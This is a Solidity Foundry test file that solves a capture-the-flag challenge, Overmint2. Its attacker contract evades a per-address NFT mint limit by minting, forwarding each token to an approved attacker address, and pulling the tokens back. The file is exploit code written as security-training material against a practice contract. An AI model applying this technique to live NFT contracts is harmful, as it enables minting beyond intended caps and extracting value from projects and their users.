// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint2} from "src/CTFs/Overmint2.sol";

contract Overmint2Attacker is Test {
    AttackerContract2 attackerContract2;
    Overmint2 victim;

    address public attacker = address(0x10);

    function setUp() external {
        attackerContract2 = new AttackerContract2();
        victim = new Overmint2();
    }

    function test_AttackerContract2() external {
        console.log("address(attacker)", address(attacker));
        console.log("Overmint2Attacker", address(attackerContract2));
        console.log("victim", address(victim));

        vm.startPrank(attacker);

        // set the AttackerContract2 can control all the attacker's nft
        victim.setApprovalForAll(address(attackerContract2), true);

        console.log(victim.balanceOf(attacker));

        // attacking....
        attackerContract2.callVictimsMint(address(victim));
        vm.stopPrank();

        vm.prank(address(attackerContract2));
        assertEq(victim.success(), true);

        console.log(victim.balanceOf(address(attackerContract2)));
    }
}

/**
 * @dev Attack procession:
 * 1: Attacker should setApprovalForAll, make the AttackerContract2 can transfer all the attacker's NFT
 * 2: each time the AttackerContract2 received the nft and then transfer the nft to the Attacker.
 * 3: Until mint 5 nfts, transfer the 5 nfts to the AttackerContract2 address
 *
 */
contract AttackerContract2 {
    function callVictimsMint(address victimsAddress) external {
        // totalSupply = tokenId
        while (Overmint2(victimsAddress).totalSupply() <= 5) {
            Overmint2(victimsAddress).mint();
            // each time received the nft, directly send to the attacker
            Overmint2(victimsAddress).transferFrom(address(this), msg.sender, Overmint2(victimsAddress).totalSupply());
        }

        uint256 maxTokenIds = Overmint2(victimsAddress).totalSupply();
        while (maxTokenIds > 1) {
            Overmint2(victimsAddress).transferFrom(msg.sender, address(this), maxTokenIds);
            maxTokenIds--;
        }
    }
}
